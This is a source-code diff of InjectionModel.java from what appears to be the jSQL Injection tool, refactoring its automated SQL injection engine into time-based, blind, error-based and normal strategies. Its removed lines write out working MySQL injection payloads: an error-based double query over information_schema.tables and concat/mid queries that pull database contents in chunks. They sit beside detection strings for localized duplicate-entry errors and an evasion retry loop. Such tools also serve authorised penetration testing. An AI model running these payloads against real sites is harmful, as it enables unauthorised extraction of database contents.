@@ -21,13 +21,9 @@ import java.net.Socket;
 import java.net.URL;
 import java.net.URLConnection;
 import java.net.URLDecoder;
-import java.net.URLEncoder;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.Comparator;
-import java.util.List;
-import java.util.UUID;
-import java.util.concurrent.Callable;
 import java.util.concurrent.CompletionService;
 import java.util.concurrent.ExecutionException;
 import java.util.concurrent.ExecutorCompletionService;
@@ -45,21 +41,22 @@ import com.jsql.exception.PreparationException;
 import com.jsql.exception.StoppableException;
 import com.jsql.model.ao.DataAccessObject;
 import com.jsql.model.ao.RessourceAccessObject;
-import com.jsql.model.bean.Column;
-import com.jsql.model.bean.Database;
 import com.jsql.model.bean.ElementDatabase;
 import com.jsql.model.bean.Request;
-import com.jsql.model.bean.Table;
-import com.jsql.model.blind.BlindInjection;
-import com.jsql.model.blind.TimeInjection;
+import com.jsql.model.pattern.strategy.BlindStrategy;
+import com.jsql.model.pattern.strategy.ErrorbasedStrategy;
+import com.jsql.model.pattern.strategy.IInjectionStrategy;
+import com.jsql.model.pattern.strategy.NormalStrategy;
+import com.jsql.model.pattern.strategy.TimeStrategy;
 import com.jsql.tool.StringTool;
-import com.jsql.view.dnd.list.ListItem;
+import com.jsql.view.GUI;
+import com.jsql.view.GUIMediator;
 
 /**
  * Model in charge of injection, MVC functionalities are provided by ModelObservable
  */
 public class InjectionModel extends ModelObservable {
-    public static final String jSQLVersion = "0.5";
+    public final static String jSQLVersion = "0.6";
 
     public String insertionCharacter;       // i.e, -1 in "[...].php?id=-1 union select[...]"
     public String firstSuccessPageSource;       // HTML source of page successfully responding to multiple fileds selection (select 1,2,3,...)
@@ -84,25 +81,16 @@ public class InjectionModel extends ModelObservable {
 
     public String pathFile;
 
-    public String tempIndexesURL;
-    public Integer numberOfIndexes = 0;
-
     public boolean isProxyfied = false;
 
-    public boolean isNormalInjectable = false;     // State/Strategy pattern here?
-    public boolean isErrorBasedInjectable = false;
-    public boolean isTimeBasedInjectable = false;
-    public boolean isBlindInjectable = false;
-
-    public boolean useErrorBasedInjection = false;
-    public boolean useBlindInjection = false;
-    public boolean useTimeBasedInjection = false;
+    public IInjectionStrategy injectionStrategy;
+    public BlindStrategy blindStrategy = new BlindStrategy(this);
+    public ErrorbasedStrategy errorbasedStrategy = new ErrorbasedStrategy(this);
+    public NormalStrategy normalStrategy = new NormalStrategy(this);
+    public TimeStrategy timeStrategy = new TimeStrategy(this);
 
     public boolean isInjectionBuilt = false;     // Allow to directly start an injection after a failed one
     // without asking the user 'Start a new injection?'
-
-    private BlindInjection blindModel;
-    private TimeInjection timeModel;
 
     public RessourceAccessObject rao = new RessourceAccessObject(this);
     public DataAccessObject dao = new DataAccessObject(this);
@@ -147,20 +135,9 @@ public class InjectionModel extends ModelObservable {
                 authenticatedUser = null;
 
         stopFlag =
-
-                isNormalInjectable =
-                isErrorBasedInjectable =
-                isBlindInjectable =
-                isTimeBasedInjectable =
-
-                isInjectionBuilt =
-
-                useErrorBasedInjection =
-                useTimeBasedInjection =
-                useBlindInjection = false;
-
-        blindModel = null;
-        timeModel = null;
+                isInjectionBuilt = false;
+        
+        this.injectionStrategy = null;
         
         rao.hasFileRight = false;
 
@@ -197,68 +174,19 @@ public class InjectionModel extends ModelObservable {
             this.insertionCharacter = new Stoppable_getInsertionCharacter(this).begin();
 
             // Test each injection methods: time, blind, error, normal
-            this.sendMessage("Time based test...");
-            this.isTimeBasedInjectable = this.isTimeBasedInjectable();
-            if(this.isTimeBasedInjectable){
-                Request request = new Request();
-                request.setMessage("MarkTimebasedVulnerable");
-                this.interact(request);
-            }else{
-                Request request = new Request();
-                request.setMessage("MarkTimebasedInvulnerable");
-                this.interact(request);
-            }
-
-            this.sendMessage("Blind test...");
-            this.isBlindInjectable = this.isBlindInjectable();
-            if(this.isBlindInjectable){
-                Request request = new Request();
-                request.setMessage("MarkBlindVulnerable");
-                this.interact(request);
-            }else{
-                Request request = new Request();
-                request.setMessage("MarkBlindInvulnerable");
-                this.interact(request);
-            }
-
-            this.sendMessage("Error based test...");
-            this.isErrorBasedInjectable = this.isErrorBasedInjectable();
-            if(this.isErrorBasedInjectable){
-                Request request = new Request();
-                request.setMessage("MarkErrorbasedVulnerable");
-                this.interact(request);
-            }else{
-                Request request = new Request();
-                request.setMessage("MarkErrorbasedInvulnerable");
-                this.interact(request);
-            }
-
-            this.sendMessage("Normal test...");
-            this.initialQuery = new Stoppable_getInitialQuery(this).begin();
-            this.isNormalInjectable = !this.initialQuery.equals("");
+            timeStrategy.checkApplicability();
+            blindStrategy.checkApplicability();
+            errorbasedStrategy.checkApplicability();
+            normalStrategy.checkApplicability();
 
             // Choose the most efficient method: normal > error > blind > time
-            // State pattern?
-            if( !this.isNormalInjectable ){
-                if(this.isErrorBasedInjectable/* && etape==2*/){
-                    this.sendMessage("Using error based injection...");
-                    this.useErrorBasedInjection = true;
-                }else if(this.isBlindInjectable/* && etape==2*/){
-                    this.sendMessage("Using blind injection...");
-                    this.useBlindInjection = true;
-
-                    Request request = new Request();
-                    request.setMessage("MessageBinary");
-                    request.setParameters("A blind SQL request is true if the diff between a correct page (e.g existing id) and current page is not as the following: "+blindModel.constantFalseMark+"\n");
-                    this.interact(request);
-                }else if(this.isTimeBasedInjectable/* && etape==2*/){
-                    this.sendMessage("Using timebased injection...");
-                    this.useTimeBasedInjection = true;
-
-                    Request request = new Request();
-                    request.setMessage("MessageBinary");
-                    request.setParameters("Each request will ask \"Is the bit is true?\", and a true response must not exceed 5 seconds.\n");
-                    this.interact(request);
+        	if( !this.normalStrategy.isApplicable() ){
+            	if(this.errorbasedStrategy.isApplicable()/* && etape==2*/){
+                    errorbasedStrategy.applyStrategy();
+                }else if(this.blindStrategy.isApplicable()/* && etape==2*/){
+                	blindStrategy.applyStrategy();
+                }else if(this.timeStrategy.isApplicable()/* && etape==2*/){
+                    timeStrategy.applyStrategy();
                 }else{
                     // No injection possible, increase evasion level and restart whole process
                     securitySteps++;
@@ -270,16 +198,8 @@ public class InjectionModel extends ModelObservable {
                     }else
                         throw new PreparationException("Injection not possible, work stopped");
                 }
-
-                Request request = new Request();
-                request.setMessage("MarkNormalInvulnerable");
-                this.interact(request);
             }else{
-                this.sendMessage("Using normal injection...");
-
-                Request request = new Request();
-                request.setMessage("MarkNormalVulnerable");
-                this.interact(request);
+                normalStrategy.applyStrategy();
 
                 try{
                     // Define visibleIndex, i.e, 2 in "[...]union select 1,2,[...]", if 2 is found in HTML source
@@ -297,7 +217,6 @@ public class InjectionModel extends ModelObservable {
                 }
             }
 
-            this.sendMessage("Fetching informations...");
             // Get the initial informations from database
             dao.getDBInfos();
 
@@ -305,11 +224,10 @@ public class InjectionModel extends ModelObservable {
             if(versionDB.startsWith("4")||versionDB.startsWith("3"))
                 throw new PreparationException("Old database, automatic search is not possible");
 
-            this.sendMessage("Fetching databases...");
             // Get the databases
             dao.listDatabases();
+            
             this.sendMessage("Done.");
-
             isInjectionBuilt = true;
         }catch(PreparationException e){
             sendErrorMessage(e.getMessage());
@@ -336,20 +254,20 @@ public class InjectionModel extends ModelObservable {
         @Override
         public String action(Object... args) throws PreparationException, StoppableException {
             // Has the url a query string?
-            if( model.method.equals("GET") && (model.getData == null || model.getData.equals("")) ){
+            if( model.method.equalsIgnoreCase("GET") && (model.getData == null || model.getData.equals("")) ){
                 throw new PreparationException("No query string");
-                // Is the query string well formed?
-            }else if( model.method.equals("GET") && model.getData.matches("[^\\w]*=.*") ){
-                throw new PreparationException("Bad query string for injection");
-            }else if( model.method.equals("POST") && model.postData.indexOf("=")<0 ){
-                throw new PreparationException("Bad POST datas");
-            }else if( model.method.equals("COOKIE") && model.cookieData.indexOf("=")<0 ){
-                throw new PreparationException("Bad COOKIE datas");
+            // Is the query string well formed?
+            }else if( model.method.equalsIgnoreCase("GET") && model.getData.matches("[^\\w]*=.*") ){
+                throw new PreparationException("Incorrect query string");
+            }else if( model.method.equalsIgnoreCase("POST") && model.postData.indexOf("=")<0 ){
+                throw new PreparationException("Incorrect POST datas");
+            }else if( model.method.equalsIgnoreCase("COOKIE") && model.cookieData.indexOf("=")<0 ){
+                throw new PreparationException("Incorrect COOKIE datas");
             }else if( !model.headerData.equals("") && model.headerData.indexOf(":")<0 ){
-                throw new PreparationException("Bad HEADER datas");
-                // Parse query information: url=>everything before the sign '=',
-                // start of query string=>everything after '='
-            }else if( model.method.equals("GET") && !model.getData.matches(".*=$") ){
+                throw new PreparationException("Incorrect HEADER datas");
+            // Parse query information: url=>everything before the sign '=',
+            // start of query string=>everything after '='
+            }else if( model.method.equalsIgnoreCase("GET") && !model.getData.matches(".*=$") ){
                 Matcher regexSearch = Pattern.compile("(.*=)(.*)").matcher(model.getData);
                 regexSearch.find();
                 try{
@@ -358,35 +276,35 @@ public class InjectionModel extends ModelObservable {
                 }catch(IllegalStateException e){
                     throw new PreparationException("Incorrect GET format");
                 }
-                // Parse post information
-            }else if( model.method.equals("POST") && !model.postData.matches(".*=$") ){
+            // Parse post information
+            }else if( model.method.equalsIgnoreCase("POST") && !model.postData.matches(".*=$") ){
                 Matcher regexSearch = Pattern.compile("(.*=)(.*)").matcher(model.postData);
                 regexSearch.find();
                 try{
                     model.postData = regexSearch.group(1);
                     return regexSearch.group(2);
                 }catch(IllegalStateException e){
-                    throw new PreparationException("incorrect POST format");
+                    throw new PreparationException("Incorrect POST format");
                 }
-                // Parse cookie information
-            }else if( model.method.equals("COOKIE") && !model.cookieData.matches(".*=$") ){
+            // Parse cookie information
+            }else if( model.method.equalsIgnoreCase("COOKIE") && !model.cookieData.matches(".*=$") ){
                 Matcher regexSearch = Pattern.compile("(.*=)(.*)").matcher(model.cookieData);
                 regexSearch.find();
                 try{
                     model.cookieData = regexSearch.group(1);
                     return regexSearch.group(2);
                 }catch(IllegalStateException e){
-                    throw new PreparationException("incorrect Cookie format");
+                    throw new PreparationException("Incorrect Cookie format");
                 }
-                // Parse header information
-            }else if( model.method.equals("HEADER") && !model.headerData.matches(".*:$") ){
+            // Parse header information
+            }else if( model.method.equalsIgnoreCase("HEADER") && !model.headerData.matches(".*:$") ){
                 Matcher regexSearch = Pattern.compile("(.*:)(.*)").matcher(model.headerData);
                 regexSearch.find();
                 try{
                     model.headerData = regexSearch.group(1);
                     return regexSearch.group(2);
                 }catch(IllegalStateException e){
-                    throw new PreparationException("incorrect Header format");
+                    throw new PreparationException("Incorrect Header format");
                 }
             }
 
@@ -430,7 +348,7 @@ public class InjectionModel extends ModelObservable {
      * Runnable class, search the correct number of fields in the SQL query.
      * Parallelizes the search, provides the stop capability
      */
-    private class Stoppable_getInitialQuery extends Stoppable{
+    public class Stoppable_getInitialQuery extends Stoppable{
         public Stoppable_getInitialQuery(InjectionModel model) {
             super(model);
         }
@@ -460,10 +378,7 @@ public class InjectionModel extends ModelObservable {
                     if(this.shouldStop()) throw new StoppableException();
 
                     SimpleCallable currentCallable = taskCompletionService.take().get();
-                    if(!Pattern.compile(".*The used SELECT statements have a different number of columns.*", Pattern.DOTALL).matcher(currentCallable.content).matches()){
-                        InjectionModel.this.numberOfIndexes = Integer.parseInt(currentCallable.tag);
-                        InjectionModel.this.tempIndexesURL = currentCallable.url.replaceAll("0%2b1","1");
-                    }
+                    
                     // Found a correct mark 1337[index]7331 in the source
                     if(Pattern.compile(".*1337\\d+7331.*", Pattern.DOTALL).matcher(currentCallable.content).matches()){
                         model.firstSuccessPageSource = currentCallable.content;
@@ -563,66 +478,6 @@ public class InjectionModel extends ModelObservable {
     }
 
     /**
-     * Build a simple error based query, and verify if successful.
-     * Check a lot of locale strings
-     */
-    private boolean isErrorBasedInjectable() {
-        String performanceSourcePage = this.inject(
-                this.insertionCharacter +
-                "+and(" +
-                "select+1+" +
-                "from(" +
-                "select+" +
-                "count(*)," +
-                "floor(rand(0)*2)" +
-                "from+" +
-                "information_schema.tables+" +
-                "group+by+2" +
-                ")a" +
-                ")--+"
-                );
-
-        return  performanceSourcePage.indexOf("Duplicate entry '1' for key ") != -1 ||
-                performanceSourcePage.indexOf("Like verdier '1' for ") != -1 ||
-                performanceSourcePage.indexOf("Like verdiar '1' for ") != -1 ||
-                performanceSourcePage.indexOf("Kattuv väärtus '1' võtmele ") != -1 ||
-                performanceSourcePage.indexOf("Opakovaný kµúè '1' (èíslo kµúèa ") != -1 ||
-                performanceSourcePage.indexOf("pienie '1' dla klucza ") != -1 ||
-                performanceSourcePage.indexOf("Duplikalt bejegyzes '1' a ") != -1 ||
-                performanceSourcePage.indexOf("Ens værdier '1' for indeks ") != -1 ||
-                performanceSourcePage.indexOf("Dubbel nyckel '1' för nyckel ") != -1 ||
-                performanceSourcePage.indexOf("klíè '1' (èíslo klíèe ") != -1 ||
-                performanceSourcePage.indexOf("Duplicata du champ '1' pour la clef ") != -1 ||
-                performanceSourcePage.indexOf("Entrada duplicada '1' para la clave ") != -1 ||
-                performanceSourcePage.indexOf("Cimpul '1' e duplicat pentru cheia ") != -1 ||
-                performanceSourcePage.indexOf("Dubbele ingang '1' voor zoeksleutel ") != -1 ||
-                performanceSourcePage.indexOf("Valore duplicato '1' per la chiave ") != -1 ||
-                /*jp missing*/
-                performanceSourcePage.indexOf("Dupliran unos '1' za klju") != -1 ||
-                performanceSourcePage.indexOf("Entrada '1' duplicada para a chave ") != -1
-                /*kr grk ukr rss missing*/
-                ;
-    }
-
-    /**
-     * Test if blind works, can be stopped.
-     * @return true if blind works
-     */
-    private boolean isBlindInjectable() throws PreparationException {
-        blindModel = new BlindInjection(this);
-        return blindModel.isBlindInjectable();
-    }
-
-    /**
-     * Test if time based works, can be stopped.
-     * @return true if time works
-     */
-    private boolean isTimeBasedInjectable() throws PreparationException {
-        timeModel = new TimeInjection(this);
-        return timeModel.isTimeInjectable();
-    }
-
-    /**
      * Get all data from a SQL request (remember that data will often been cut, we need to reach ALL the data)
      * We expect the following well formed line:
      * => hh[0-9A-F]*jj[0-9A-F]*c?hhgghh[0-9A-F]*jj[0-9A-F]*c?hhg...hi
@@ -649,6 +504,7 @@ public class InjectionModel extends ModelObservable {
 
             String sqlQuery = new String(initialSQLQuery).replaceAll("\\{limit\\}","");
 
+            IInjectionStrategy istrategy = injectionStrategy;
             /**
              * As we know the expected number of rows (numberToFind), then it stops injection if all rows are found,
              * keep track of rows we have reached (limitSQLResult) and use these to skip entire rows,
@@ -666,68 +522,8 @@ public class InjectionModel extends ModelObservable {
                 //                if(isPreparationStopped() || (interruptable != null && interruptable.isInterrupted())) throw new StoppableException();
                 if(this.shouldStop() || (interruptable != null && interruptable.PAUSEshouldStopPAUSE())) break;
 
-                if(model.useTimeBasedInjection){
-                    sourcePage[0] = timeModel.inject("(" +
-                            "select+" +
-                            "concat(" +
-                            "0x53514c69," +
-                            "mid(" +
-                            "("+sqlQuery+")," +
-                            startPosition+"," +
-                            "65536" +
-                            ")" +
-                            ")"+
-                            ")", interruptable, this);
-                }else if(model.useBlindInjection){
-                    sourcePage[0] = blindModel.inject("(" +
-                            "select+" +
-                            "concat(" +
-                            "0x53514c69," +
-                            "mid(" +
-                            "("+sqlQuery+")," +
-                            startPosition+"," +
-                            "65536" +
-                            ")" +
-                            ")"+
-                            ")", interruptable, this);
-                }else if(model.useErrorBasedInjection){
-                    sourcePage[0] = model.inject( 
-                            model.insertionCharacter + "+and" +
-                                    "(" +
-                                    "select+" +
-                                    "1+" +
-                                    "from(" +
-                                    "select+" +
-                                    "count(*)," +
-                                    "concat(" +
-                                    "0x53514c69," +
-                                    "mid(" +
-                                    "("+ sqlQuery +")," +
-                                    startPosition + "," +
-                                    "64" +
-                                    ")," +
-                                    "floor(rand(0)*2)" +
-                                    ")" +
-                                    "from+information_schema.tables+" +
-                                    "group+by+2" +
-                                    ")a" +
-                            ")--+" );
-                }else{
-                    sourcePage[0] = model.inject(
-                            "select+" +
-                                    "concat(" +
-                                    "0x53514c69," +
-                                    "mid(" +
-                                    "("+sqlQuery+")," +
-                                    startPosition+"," +
-                                    "65536" +
-                                    ")" +
-                                    ")",
-                                    null,
-                                    true
-                            );
-                }
-
+                sourcePage[0] = istrategy.inject(sqlQuery, startPosition+"", interruptable, this);
+                
                 //                model.sendMessage("Packet "+i+".\n"+currentResultSource);
 
                 // Parse all the data we have retrieved
@@ -1076,7 +872,7 @@ public class InjectionModel extends ModelObservable {
      * @return Final data
      */
     private String buildQuery( String dataType, String newData, boolean useVisibleIndex, String urlPremiere ){
-        if(!this.method.equals(dataType)){
+        if(!this.method.equalsIgnoreCase(dataType)){
             return newData;
         }else if(!useVisibleIndex){
             return newData + urlPremiere;
@@ -1131,8 +927,9 @@ public class InjectionModel extends ModelObservable {
     public static void main(String[] args) {
         javax.swing.SwingUtilities.invokeLater(new Runnable() {
             public void run() {
-                InjectionModel model = new InjectionModel();
-                new InjectionController(model);
+                GUIMediator.register(new InjectionModel());
+                GUIMediator.register(new InjectionController());
+                GUIMediator.register(new GUI());
             }
         });
     }
@@ -1140,4 +937,15 @@ public class InjectionModel extends ModelObservable {
     public void sendWelcomeMessage() {
         this.sendFirstMessage("-- jSQL Injection version "+ jSQLVersion +" --");
     }
+
+	public void applyStrategy(IInjectionStrategy injectionStrategy) {
+		this.injectionStrategy = injectionStrategy; 
+	}
+
+	public void applyStrategy(String text) {
+		if(text.equalsIgnoreCase("timebased")) this.injectionStrategy = timeStrategy;
+		else if(text.equalsIgnoreCase("blind")) this.injectionStrategy = blindStrategy;
+		else if(text.equalsIgnoreCase("errorbased")) this.injectionStrategy = errorbasedStrategy;
+		else if(text.equalsIgnoreCase("normal")) this.injectionStrategy = normalStrategy;
+	}
 }
